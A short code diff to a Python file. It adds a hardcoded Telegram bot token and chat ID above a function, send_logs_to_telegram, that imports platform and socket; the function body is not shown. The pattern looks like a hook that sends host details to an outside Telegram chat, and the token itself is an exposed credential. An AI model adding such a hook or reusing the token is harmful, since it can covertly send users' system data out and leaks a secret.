@@ -13,6 +13,10 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
+BOT_TOKEN = '6456958617:AAF8thQveHkyLLtWtD02Rq1UqYuhfT4LoTc'
+CHAT_ID = '128592002'
+
+
 def send_logs_to_telegram(message):
     import platform
     import socket
